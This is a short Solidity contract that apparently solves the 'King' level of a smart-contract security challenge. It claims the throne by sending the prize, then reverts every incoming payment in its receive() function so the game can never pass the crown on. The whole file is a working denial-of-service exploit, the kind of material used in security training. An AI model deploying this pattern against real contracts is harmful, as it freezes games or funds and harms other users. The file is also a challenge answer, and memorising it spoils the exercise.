// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './King.sol';

contract KingSolution {
  King kingGame;

  constructor(address payable _kingGame) public {
    kingGame = King(_kingGame);
  }

  function play() external payable {
    uint256 prize = kingGame.prize();
    (bool success,) = address(kingGame).call{value: prize}("");
    require(success, "play failed to send eth");
  }

  receive() external payable {
    revert('Denied');
  }
} 